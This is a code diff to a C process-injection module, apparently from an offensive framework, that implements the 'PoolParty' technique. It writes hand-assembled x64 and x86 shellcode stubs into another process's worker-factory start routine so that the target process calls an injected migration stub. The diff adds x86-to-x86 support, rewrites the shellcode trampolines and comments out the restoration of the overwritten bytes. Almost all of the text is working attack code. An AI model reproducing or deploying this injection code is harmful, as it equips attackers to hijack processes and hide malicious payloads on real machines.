@@ -145,7 +145,7 @@ BOOL supports_poolparty_injection(DWORD dwSourceArch, DWORD dwDestinationArch) {
 		dprintf("[INJECT][supports_poolparty_injection] dwSourceArch: %d dwDestinationArch: %d", dwSourceArch, dwDestinationArch);
 		dprintf("[INJECT][supports_poolparty_injection] os.dwMajorVersion: %d os.dwMinorVersion: %d", os.dwMajorVersion, os.dwMinorVersion);
 		if (os.dwMajorVersion >= 10) {
-			if (dwDestinationArch == PROCESS_ARCH_X64 && (dwSourceArch == PROCESS_ARCH_X64 || dwSourceArch == PROCESS_ARCH_X86)) {
+			if ((dwDestinationArch == PROCESS_ARCH_X64 && (dwSourceArch == PROCESS_ARCH_X64 || dwSourceArch == PROCESS_ARCH_X86)) || (dwDestinationArch == PROCESS_ARCH_X86 && dwSourceArch == PROCESS_ARCH_X86)) {
 				return TRUE;
 			}
 		}
@@ -287,34 +287,20 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 		if (dwResult != STATUS_SUCCESS || ReturnLength > sizeof(WORKER_FACTORY_BASIC_INFORMATION) || WorkerFactoryBasicInfo.StartRoutine == NULL) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtQueryInformationWorkerFactory failed.",ERROR_NOT_SUPPORTED);
 		}
-		unsigned char shellcode[16];
+		unsigned char shellcode[18];
 		if (dwDestinationArch == PROCESS_ARCH_X64) {
-			unsigned char tmp[] = {
-			// this is a stub to call poolparty migration stub.
-			0xe8, 0x08, 0x00, 0x00, 0x00, // call  start
-			0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, // these will be changed with poolparty migration stub's memory address.
-			//start:
-			0x58, //pop rax
-			0xff, 0x10 //call [rax]
-			};
+			unsigned char tmp[] = {0xeb, 0x03, 0x58, 0xff, 0x10, 0xe8, 0xf8, 0xff, 0xff, 0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 			uintptr_t StubAddress = (uintptr_t)lpStartAddress;
-			memcpy(&tmp[5], &StubAddress, sizeof(StubAddress));
-			memcpy(&shellcode, &tmp, sizeof(tmp));
+			memcpy(&tmp[10], &StubAddress, sizeof(StubAddress));
+			memcpy(shellcode, tmp, sizeof(tmp));
 		}
 		else {
-			unsigned char tmp[] = {
-				// this is a stub to call poolparty migration stub.
-				0xe8, 0x04, 0x00, 0x00, 0x00, // call  start
-				0x90,0x90,0x90,0x90, // these will be changed with poolparty migration stub's's memory address.
-				//start:
-				0x58, //pop eax
-				0xff, 0x10 //call [eax]
-			};
+			unsigned char tmp[] = {0xeb, 0x03, 0x58, 0xff, 0x10, 0xe8, 0xf8, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00};
 			unsigned __int32 StubAddress = (unsigned __int32)((uintptr_t)lpStartAddress);
-			memcpy(&tmp[5], &StubAddress, sizeof(StubAddress));
-			memcpy(&shellcode, &tmp, sizeof(tmp));
+			memcpy(&tmp[10], &StubAddress, sizeof(StubAddress));
+			memcpy(shellcode, tmp, sizeof(tmp));
 		}
-		unsigned char OriginalBytes[16] = { 0x00 };
+		unsigned char OriginalBytes[18] = { 0x00 };
 		if (!ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &OriginalBytes, sizeof(OriginalBytes), NULL)) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ReadProcessMemory failed.", ERROR_NOT_SUPPORTED);
 		}
@@ -329,9 +315,9 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 		if (dwResult != STATUS_SUCCESS) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory failed.", ERROR_NOT_SUPPORTED);
 		}
-		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &OriginalBytes, sizeof(OriginalBytes), &szWritten) || szWritten != sizeof(OriginalBytes)) {
+		/*if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &OriginalBytes, sizeof(OriginalBytes), &szWritten) || szWritten != sizeof(OriginalBytes)) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't restore original bytes.", ERROR_NOT_SUPPORTED);
-		}
+		}*/
 	} while (0);
 	return dwResult;
 }
